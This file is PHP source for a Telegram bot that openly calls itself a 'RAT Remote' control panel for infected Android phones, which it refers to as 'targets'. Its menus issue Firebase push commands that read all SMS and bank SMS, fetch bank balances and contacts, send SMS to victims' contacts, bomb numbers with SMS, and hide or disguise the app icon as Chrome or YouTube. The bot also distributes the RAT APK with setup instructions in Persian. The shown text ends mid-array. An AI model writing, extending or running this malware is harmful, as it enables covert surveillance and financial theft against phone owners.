<?php


include("chalim.php");

define('TOKEN', $bot_token);
define('PORT_SUDO', $sudo_port);
define('PROJECT_ID', $project_id);
define('FILE', $file);

#Write Requirements
if (!file_exists("data")) {
    mkdir("data");
    mkdir("user");
}
if (!file_exists("link.txt")) {

    file_put_contents("link.txt", "https://google.com");
    file_put_contents("data/devices.txt", "");
    file_put_contents("data/contact.txt", "0");
    file_put_contents("data/firstsms.txt", "off");
    file_put_contents("data/autohide.txt", "off");
    file_put_contents("data/number-first.txt", "09123456789");
    file_put_contents("data/message-first.txt", $dev_id);
    file_put_contents("data/offline-number.txt", "09123456789");
    file_put_contents("user/index.php", "");
    file_put_contents("data/index.php", "");
    file_put_contents("data/pingmsg.txt", "0");
    file_put_contents("data/onlineusers.txt", "");
    file_put_contents("data/online_model.txt", "list");

}
#ip function
function Client_IP()
{
    $target_client_ip = @$_SERVER['HTTP_CLIENT_IP'];
    $target_forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $target_remote_ip = $_SERVER['REMOTE_ADDR'];
    if (filter_var($target_client_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_client_ip;
    } elseif (filter_var($target_forward_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_forward_ip;
    } else {
        $ip = $target_remote_ip;
    }
    return $ip;
}

#bot Function
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}

#Send Message Function
function smg($chatid, $text, $keyboard)
{
    bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

#Edit Message Func
function emg($chatid, $message_id, $text, $keyboard)
{
    bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

function sf($file, $caption, $id = null)
{
    $url = "https://api.telegram.org/bot" . API_KEY . "/sendDocument?chat_id=" . $id;
    $post = array('parse_mode' => 'HTML', 'caption' => "<b>$caption</b>", 'document' => new CURLFile(realpath("$file")));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}

#regular requests
function getAccessToken($file)
{
    require 'vendor/autoload.php';
    $serviceAccountFilePath = "$file";
    $serviceAccount = json_decode(file_get_contents($serviceAccountFilePath), true);

    // Generate the JWT using the service account credentials
    $clientEmail = $serviceAccount['client_email'];
    $privateKey = $serviceAccount['private_key'];

    $payload = [
        "iss" => $clientEmail,
        "scope" => "https://www.googleapis.com/auth/firebase.messaging",
        "aud" => "https://www.googleapis.com/oauth2/v4/token",
        "iat" => time(),
        "exp" => time() + 3600
    ];

    $jwt = Firebase\JWT\JWT::encode($payload, $privateKey, 'RS256');

    // Get the OAuth 2.0 access token
    $requestBody = [
        "grant_type" => "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion" => $jwt
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.googleapis.com/oauth2/v4/token");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($requestBody));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $accessToken = json_decode($response)->access_token;

    return $accessToken;
}

#regular requests
function requests($mode, $device_id)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("sath.txt", $result);
}

function send_sms_contact($dev_id_use)
{
    $send_sms_contacts = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "back_panel"], ['text' => "Send ››", 'callback_data' => "last_contacts $dev_id_use"]]
    ]]);
    return $send_sms_contacts;
}

function requestSMSContact($mode, $device_id, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);

}

#Sms Request
function requestSMS($mode, $device_id, $phone, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "phone" => $phone,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);

}

#request to all subscribtion
function requestsAll($mode_all)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode_all
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("xd.txt", PROJECT_ID);

}

#check host Location Resolver
function location($node)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/nodes/hosts");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $loc = json_decode(curl_exec($ch), true)['nodes'][$node]['location'][2];
    curl_close($ch);
    return $loc;
}

#check filtering
function checkhost($domain)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-http?host=$domain&node=ir1.node.check-host.net&node=ir3.node.check-host.net&node=ir5.node.check-host.net&node=ir6.node.check-host.net");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $id = json_decode(curl_exec($ch), true)['request_id'];
    sleep(2);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-result/$id");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $result = json_decode(curl_exec($ch), true);
    $arr = array();
    foreach ($result as $node => $value) {
        if (isset($value)) {
            $name = location($node);
            $arr[$name] = ['time' => $value[0][1], 'status' => $value[0][2], 'statuscode' => $value[0][3], "serverip" => $value[0][4]];
        }
    }
    return $arr;
}

#----------------------------------------------------------------------
#telegram Update Requirements 
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$message_id = $update->message->message_id;
$data = $update->callback_query->data;
$chat_id = isset($update->callback_query->message->chat->id) ? $update->callback_query->message->chat->id : $update->message->chat->id;
$from_id = isset($update->callback_query->message->from->id) ? $update->callback_query->message->from->id : $update->message->from->id;
$text = $update->message->text;
$mi = $update->callback_query->message->message_id;
$first_n = $update->message->from->first_name;
$last_n = $update->message->from->last_name;
$first = $update->callback_query->from->first_name;
$last = $update->callback_query->from->last_name;
$usernamee = $update->message->from->username;
$username = $update->callback_query->from->username;
#---------------------------------------------------------------------
#shourt Callers Value
$command = file_get_contents("user/$chat_id/command.txt");
$text_message = file_get_contents("user/$chat_id/message.txt");
$device_id = file_get_contents("user/$chat_id/device-id.txt");
$device_model = file_get_contents("user/$chat_id/device-model.txt");
$number_message = file_get_contents("user/$chat_id/numberlist.txt");
$ringer_mode = file_get_contents("user/$chat_id/ringer.txt");
$apk_mode = file_get_contents("user/$chat_id/apk.txt");
$action_autohide = file_get_contents("data/autohide.txt");
$status_offline = file_get_contents("user/$device_id-offline.txt");
$target_name = file_get_contents("user/$device_id-name.txt");
$install_ip = file_get_contents("user/$device_id-ip.txt");
$action_firstsms = file_get_contents("data/firstsms.txt");
$offline_number = file_get_contents("data/offline-number.txt");
$model_online = file_get_contents("data/online_model.txt");
$contact = file_get_contents("data/contact.txt");
$link_show = file_get_contents("link.txt");
#----------------------------------------------------------------
#shishe ei
$start_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "🪄 ʀᴇǫᴜᴇꜱᴛ ᴛᴏ ᴀʟʟ 🪄", 'callback_data' => 'setting'], ['text' => "📊 ᴀʟʟ ᴛᴀʀɢᴇᴛꜱ ᴘɪɴɢ 📊", 'callback_data' => 'online_checo']],
    [['text' => "⚙️ ɢᴇᴛ ᴀᴘᴋ ⚙️", 'callback_data' => '/help']]
]]);
$goooo = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "🗃 ɢᴇᴛ ᴀᴘᴋ 🗃", 'callback_data' => 'apkk']],
    [['text' => "‹‹ back", 'callback_data' => 'back_home']]
]]);
#start button
function control_button($dev_id_use)
{
    $ringer_mode = file_get_contents("user/$dev_id_use-ringer.txt");
    $apk_mode = file_get_contents("user/$dev_id_use-apk.txt");

    $device_id = file_get_contents("user/$dev_id_use-model.txt");
    $status_offline2 = file_get_contents("user/$dev_id_use-offline.txt");

    $control_button = json_encode(['resize_keyboard' => true,
        'inline_keyboard' => [
            [['text' => "🔅ᴛᴀʀɢᴇᴛ ꜱᴛᴀᴛᴜꜱ/ᴘɪɴɢ 🔅", 'callback_data' => "status_user $dev_id_use"], ['text' => "$device_id", 'callback_data' => 'null']],
            [['text' => "📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏғғ 📶", 'callback_data' => "offmodeoff $dev_id_use"], ['text' => "📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏɴ 📶", 'callback_data' => "offmodeon $dev_id_use"]],
            [['text' => "✉️ ꜱᴇɴᴅ ꜱᴍꜱ ✉️", 'callback_data' => "send_sms $dev_id_use"]],
            [['text' => "📨 ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ 📨", 'callback_data' => "sms_contacts $dev_id_use"]],
            [['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $dev_id_use"], ['text' => "👤 ɢᴇᴛ ᴄᴏɴᴛᴀᴄᴛꜱ 👤", 'callback_data' => "all_contacts $dev_id_use"], ['text' => "📁 ᴀʟʟ ꜱᴍꜱ 📁", 'callback_data' => "all_sms $dev_id_use"]],
            [['text' => "💸 ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ 💸", 'callback_data' => "last_Bank_sms $dev_id_use"], ['text' => "🏦 ʙᴀɴᴋ ꜱᴍꜱ 🏦", 'callback_data' => "All_Bank_sms $dev_id_use"], ['text' => "💰 ʙᴀɴᴋꜱ ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $dev_id_use"]],
            [['text' => "🔉ᴠɪʙʀᴀᴛᴇ🔉", 'callback_data' => "vibrate_mode $dev_id_use"], ['text' => "🔇 ᴍᴜᴛᴇ ᴛᴀʀɢᴇᴛ 🔇", 'callback_data' => "silent_mode $dev_id_use"], ['text' => "🔊 ɴᴏʀᴍᴀʟ ᴛᴀʀɢᴇᴛ 🔊", 'callback_data' => "normal_mode $dev_id_use"]],
            [['text' => "👻  ʜɪᴅᴇ ɪᴄᴏɴ  👻", 'callback_data' => "hide_icon $dev_id_use"], ['text' => "🪄 ᴜɴʜɪᴅᴇ 🪄", 'callback_data' => "visible_icon $dev_id_use"]],
            [['text' => "📱 ᴍᴏᴅᴇʟ ᴅᴇᴠɪᴄᴇ", 'callback_data' => "WhatsChecker $dev_id_use"], ['text' => " 🔎 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ 🔎", 'callback_data' => "searchSMS $dev_id_use"], ['text' => "ℹ️ ꜰᴜʟʟ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ℹ️", "callback_data" => "information $dev_id_use"]],
            [['text' => "🔄 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🔄", 'callback_data' => "change $dev_id_use"]],
            [['text' => "⏫ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ⏫", 'callback_data' => 'back_home']]
        ]]);
    return $control_button;
}

#info button
function info_button($dev_id_use)
{
    $device_id = file_get_contents("user/$dev_id_use-model.txt");
    $status_offline2 = file_get_contents("user/$dev_id_use-offline.txt");


    $info_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "Name Target", 'callback_data' => "nametarget $dev_id_use"]],
        [['text' => "Clear All Info", 'callback_data' => "clearinfo $dev_id_use"]],
        [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"]]
    ]]);
    return $info_button;
}

$settings_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "🪄 ᴀᴜᴛᴏ ʜɪᴅᴅᴇɴ 🪄", 'callback_data' => 'null'], ['text' => "$action_autohide", 'callback_data' => 'auto_hide']],
    [['text' => "📶 ᴏғғ ᴍᴏᴅᴇ ɴᴜᴍʙᴇʀ 📶", 'callback_data' => 'set_number_offline_mode'], ['text' => "$offline_number", 'callback_data' => 'null']],
    [['text' => "👻 ʜɪᴅᴇ ɪᴄᴏɴ ᴀʟʟ 👻", 'callback_data' => 'hide_all'], ['text' => "💰 ʙᴀɴᴋ ɪɴғᴏ ᴀʟʟ 💰", 'callback_data' => 'get_all_balance'], ['text' => "🔇 ᴍᴜᴛᴇ ᴀʟʟ ᴛᴀʀɢᴇᴛ 🔇", 'callback_data' => 'silent_all']],
    [['text' => "👥ᴜꜱᴇʀꜱ-ᴄᴏᴜɴᴛ", 'callback_data' => 'null'], ['text' => "$contact", 'callback_data' => 'null']],
 
    [['text' => "🌐 ᴄʜᴀɴɢᴇ ᴅᴏᴍᴀɪɴ 🌐", 'callback_data' => 'set_url'], ['text' => "🧫 ᴄʜᴇᴄᴋ ʜᴏꜱᴛ 🧫", 'callback_data' => 'checkhost'], ['text' => "🔖 sʜᴏᴡ ᴅᴏᴍᴀɪɴ 🔖", 'callback_data' => 'show_url']],
    [['text' => "📤 sᴍs ʙᴏᴍʙᴇʀ ᴀʟʟ 📤", 'callback_data' => 'sms_all']],
    [['text' => "", 'callback_data' => 'set_word'], ['text' => "", 'callback_data' => 'search_all']],
    [['text' => "🗃️ ᴏɴʟɪɴᴇ ᴍᴏᴅᴇʟ 🗃️", 'callback_data' => 'online_model'], ['text' => "$model_online", 'callback_data' => 'online_model']],
    [['text' => "⏫ ʙᴀᴄᴋ ⏫", 'callback_data' => 'back_home']]
]]);
$back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_panel']]
]]);
$onli_btn = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Send Requests››", 'callback_data' => 'online_checo']]
]]);
$back_home = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_home']]
]]);
$back_settings = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']]
]]);
$dev_inline = json_encode(array('inline_keyboard' => [
    [['text' => "Get Pv Dev", 'url' => "t.me/$dev_id"]]
]));
$url_inline = json_encode(array('inline_keyboard' => [
    [['text' => "$link_show", 'url' => "$link_show"]],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']]
]));

function sms_button($dev_id_use)
{
    $sms_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "Edite Text", 'callback_data' => "edit_message $dev_id_use"]],
        [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"], ['text' => "Next ››", 'callback_data' => "set_list $dev_id_use"]]
    ]]);
    return $sms_button;
}

$model_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [[['text' => "ʟɪꜱᴛ", 'callback_data' => 'list_model'], ['text' => "ꜱɪɴɢᴇʟ", 'callback_data' => 'singel_model']],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']],
]]);
$changeiconButton = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [[['text' => "ᴄʜʀᴏᴍᴇ", 'callback_data' => 'chrome'], ['text' => "ᴛᴇʟᴇɢʀᴀᴍ", 'callback_data' => 'telegram']],
    [['text' => "ʏᴏᴜᴛᴜʙᴇ", 'callback_data' => 'youtube'], ['text' => "ɢᴏᴏɢʟᴇ", 'callback_data' => "google $datass[1]"]],
    [['text' => "‹‹ Back", 'callback_data' => 'back_panel']],
]]);
function getsmsButton($dev_id_use)
{
    $getsmsButton = json_encode(['resize_keyboard' => true, 'inline_keyboard' =>
        [[['text' => "📤ᴏᴜᴛʙᴏx📤", 'callback_data' => "sent $dev_id_use"], ['text' => "📥ɪɴʙᴏx📥", 'callback_data' => "recived $dev_id_use"]],
            [['text' => "📨ᴀʟʟ ꜱᴍꜱ📨", 'callback_data' => "Popo $dev_id_use"]],
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"]],
        ]]);
    return $getsmsButton;
}

$sms_button_all = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "Edite Text", 'callback_data' => 'edit_message_all']],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings'], ['text' => "Next ››", 'callback_data' => 'set_list_all']]
]]);
function back_sms($dev_id_use)
{
    $back_sms = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "send_sms $dev_id_use"]]
    ]]);
    return $back_sms;
}

function send_sms($dev_id_use)
{
    $send_sms = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "send_sms $dev_id_use"], ['text' => "Send ››", 'callback_data' => "last_send $dev_id_use"]]
    ]]);
    return $send_sms;
}

$send_sms_all = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings'], ['text' => "Send ››", 'callback_data' => 'last_send_all']]
]]);
if (in_array($chat_id, $sudo_user)) {
    if (preg_match('/^\/([Ss]tart)(.*)/', $text)) {
        if (!file_exists("user/$chat_id")) {
            mkdir("user/$chat_id");
            file_put_contents("user/$chat_id/command.txt", "");
            file_put_contents("user/$chat_id/message.txt", "$dev_id");
            file_put_contents("user/$chat_id/device-id.txt", "");
            file_put_contents("user/$chat_id/device-model.txt", "null");
            file_put_contents("user/$chat_id/numberlist.txt", "");
            file_put_contents("user/$chat_id/ringer.txt", "Normal");
            file_put_contents("user/$chat_id/apk.txt", "Visible");


        }
        smg($chat_id, "Hi ‹‹ <b><a href='tg://user?id=$from_id'>$first_n</a></b> ››, Welcome to the <b>RAT Remote</b> Management menu\n\n<b>Coded By : @Wild_MaTiN</b>", $start_button);


    } elseif (strpos($text, '/check') !== false) {
        $ex = explode("-", $text);
        $device_id = $ex[1];

    } elseif ($data == "back_home") {
        emg($chat_id, $mi, "‹‹ <b>Back Home</b> ›› section\n\n@Wild_MaTiN", $start_button);
        file_put_contents("user/$chat_id/command.txt", "");
        file_put_contents("user/$chat_id/ringer.txt", "Normal");
        file_put_contents("user/$chat_id/apk.txt", "Visible");
        file_put_contents("user/$chat_id/device-id.txt", "");
        file_put_contents("user/$chat_id/device-model.txt", "null");


    } elseif (strpos($data, "sms_contacts") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $sms_button = sms_button($device_id);


        file_put_contents("user/$chat_id/command.txt", "");
        emg($chat_id, $mi, "‹‹ <b>Send SMS To Contacts</b> ›› section\n\nText Message : [ <code>$text_message</code> ]", send_sms_contact($device_id));

    } elseif (strpos($data, "last_contacts") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];


        file_put_contents("user/$chat_id/command.txt", "");
        requestSMSContact("smcontact", $device_id, $text_message);
        emg($chat_id, $mi, "‹‹ <b>Send SMS To Contacts</b> Started - Response Will Send When Job Finished", $back_control);

    } elseif (strpos($data, 'back_panel') !== false) {

        $datass = explode(" ", $data);
        $control_button = control_button($datass[1]);

        emg($chat_id, $mi, "‹‹ <b>Device Control</b> ›› section\n\nSelect the desired option :", $control_button);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "back_settings") {

        emg($chat_id, $mi, "‹‹ <b>Back Settings</b> ›› section\n\nSelect the desired option :", $settings_button);
        file_put_contents("user/$chat_id/command.txt", "");
#------------------------------------------------------- 
#KalamatVorodi
        /*} elseif ($text == "Online Devices") {
            file_put_contents("data/onlineusers.txt", "");


            smg($chat_id, "Can a request to [ <b>check devices</b> ] be sent online? Click the button below", $onli_btn);

        } elseif ($data == "online_checo") {

            emg($chat_id, $mi, "Checking Online Devices ...", null);
            file_put_contents("data/miid.txt", $mi);
            requestsAll('online_device');
            file_put_contents("user/$chat_id/command.txt", "");*/


    } elseif ($text == "/list") {
        file_put_contents("data/onlineusers.txt", "");


        smg($chat_id, "Can a request to [ <b>check devices</b> ] be sent online? Click the button below", $onli_btn);

    } elseif ($data == "online_checo") {
        file_put_contents("data/onlineusers.txt", "");

        emg($chat_id, $mi, "Checking Online Devices ...", null);
        file_put_contents("data/miid.txt", $mi);
        requestsAll('online_device');
        file_put_contents("user/$chat_id/command.txt", "");


    } elseif ($data == 'apkk') {
        $cap = '

فایل رت 

ادیتش هم پوشه assets فایل Sudoport.txt پورتتون رو بزارید ( پورتتون رو تو بخش Tools میتونید ببینید )

🔴 ‌نکته : رات امضا نشده ، خودتون با اپک ادیتور میتونید امضا بزنید .
';

        bot('sendDocument', [
            'chat_id' => $chat_id,
            'document' => new CURLFile("app.apk"),
            'caption' => " $cap ",
        ]);


    } elseif ($text == "/Settings") {

        smg($chat_id, "‹‹ <b>Settings Page</b> ›› section\n\nSelect the desired option :", $settings_button);
    } elseif ($data == "setting") {
        emg($chat_id, $mi, "‹‹ <b>Settings Page</b> ›› section\n\nSelect the desired option :", $settings_button);

    } elseif ($data == "/help") {
        smg($chat_id, "<b>~ Yes 🙂‍↔️</b>", $goooo);

    } elseif ($text == "/Help") {
        smg($chat_id, "<b>Help Rat Remote $dev_name</b>
برای راهنمایی به پیوی سازنده مراجعه کنید.
        ", $dev_inline);

    } elseif (strpos($text, '/login_') !== false) {
        $txt = explode("_", $text);
        $dev_id0 = str_replace('/login_', '', $text);
        $dev_id_use = $dev_id0;
        // $USID = $txt[1];
        file_put_contents("user/$chat_id/device-id.txt", $dev_id_use);
        $device_id = file_get_contents("user/$dev_id_use-model.txt");
        $ringer_mode = file_get_contents("user/$dev_id_use-ringer.txt");
        $apk_mode = file_get_contents("user/$dev_id_use-apk.txt");

        // file_put_contents("user/$chat_id/device-model.txt", $device_id);
        $status_offline2 = file_get_contents("user/$dev_id_use-offline.txt");

        $panel_log = json_encode(['resize_keyboard' => true,
            'inline_keyboard' => [
                [['text' => "🔅ᴛᴀʀɢᴇᴛ ꜱᴛᴀᴛᴜꜱ/ᴘɪɴɢ🔅", 'callback_data' => "status_user $dev_id_use"], ['text' => "$device_id", 'callback_data' => 'null']],
                [['text' => "📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏғғ 📶", 'callback_data' => "offmodeoff $dev_id_use"], ['text' => "📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏɴ 📶", 'callback_data' => "offmodeon $dev_id_use"]],
                [['text' => "✉️ ꜱᴇɴᴅ ꜱᴍꜱ ✉️", 'callback_data' => "send_sms $dev_id_use"]],
                [['text' => "📨 ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ 📨", 'callback_data' => "sms_contacts $dev_id_use"]],
                [['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $dev_id_use"], ['text' => "👤 ɢᴇᴛ ᴄᴏɴᴛᴀᴄᴛꜱ 👤", 'callback_data' => "all_contacts $dev_id_use"], ['text' => "📁 ᴀʟʟ ꜱᴍꜱ 📁", 'callback_data' => "all_sms $dev_id_use"]],
                [['text' => "💸 ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ 💸", 'callback_data' => "last_Bank_sms $dev_id_use"], ['text' => "🏦 ʙᴀɴᴋ ꜱᴍꜱ 🏦", 'callback_data' => "All_Bank_sms $dev_id_use"], ['text' => "💰 ʙᴀɴᴋꜱ ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $dev_id_use"]],
                [['text' => "🔉ᴠɪʙʀᴀᴛᴇ🔉", 'callback_data' => "vibrate_mode $dev_id_use"], ['text' => "🔇 ᴍᴜᴛᴇ ᴛᴀʀɢᴇᴛ 🔇", 'callback_data' => "silent_mode $dev_id_use"], ['text' => "🔊 ɴᴏʀᴍᴀʟ ᴛᴀʀɢᴇᴛ 🔊", 'callback_data' => "normal_mode $dev_id_use"]],
                [['text' => "👻  ʜɪᴅᴇ ɪᴄᴏɴ  👻", 'callback_data' => "hide_icon $dev_id_use"], ['text' => "🪄 ᴜɴʜɪᴅᴇ 🪄", 'callback_data' => "visible_icon $dev_id_use"]],
                [['text' => "📱 ᴍᴏᴅᴇʟ ᴅᴇᴠɪᴄᴇ",'callback_data' => "WhatsChecker $dev_id_use"], ['text' => "🔎 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ 🔎", 'callback_data' => "searchSMS $dev_id_use"], ['text' => "ℹ️ ꜰᴜʟʟ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ℹ️", "callback_data" => "information $dev_id_use"]],
                [['text' => "🔄 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🔄", 'callback_data' => "change $dev_id_use"]],
                [['text' => "⏫ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ⏫", 'callback_data' => 'back_home']]
            ]]);

        smg($chat_id, "‹‹ <b>Device Control $dev_id_use</b> ›› section", $panel_log);

    } elseif (strpos($data, 'ls') !== false) {
        $datass = explode(" ", $data);

        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        $dev_id_use = $datass[1];
        $ringer_mode = file_get_contents("user/$dev_id_use-ringer.txt");
        $apk_mode = file_get_contents("user/$dev_id_use-apk.txt");

        $status_offline1 = file_get_contents("user/$device_id-offline.txt");
        $panel_log = json_encode(['resize_keyboard' => true,
            'inline_keyboard' => [
                [['text' => "🔅ᴛᴀʀɢᴇᴛ ꜱᴛᴀᴛᴜꜱ/ᴘɪɴɢ 🔅", 'callback_data' => "status_user $dev_id_use"], ['text' => "$device_id", 'callback_data' => 'null']],
                [['text' => "📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏғғ 📶", 'callback_data' => "offmodeoff $dev_id_use"], ['text' => "📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏɴ 📶", 'callback_data' => "offmodeon $dev_id_use"]],
                [['text' => "✉️ ꜱᴇɴᴅ ꜱᴍꜱ ✉️", 'callback_data' => "send_sms $dev_id_use"]],
                [['text' => "📨 ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ 📨", 'callback_data' => "sms_contacts $dev_id_use"]],
